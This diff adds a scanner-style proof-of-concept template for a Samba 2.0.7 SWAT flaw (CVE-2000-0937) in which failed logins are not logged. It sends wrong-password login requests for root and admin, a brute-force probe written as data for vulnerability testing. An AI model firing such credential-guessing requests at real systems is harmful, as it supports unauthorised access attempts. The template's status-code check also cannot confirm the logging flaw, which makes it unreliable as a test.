@@ -1,0 +1,56 @@
+[info]
+author = "ave"
+description = "Samba 2.0.7 SWAT 服务不记录用户名正确但密码错误的登录失败事件，攻击者可借此实施暴力密码猜解而不被察觉。PoC 通过向 SWAT 管理界面发送多次登录请求验证服务可被暴力破解。"
+id = "POC-AVE-2000-0685"
+name = "Samba 2.0.7 SWAT 登录失败日志缺失导致暴力密码猜测漏洞 PoC"
+severity = "high"
+tags = ["ave-2000-0685"]
+vuln_id = [
+    "CVE-2000-0937",
+    "AVE-2000-0685",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=root&pass=wrongpassword"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin&pass=wrongpassword123"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+]
+type = "status"
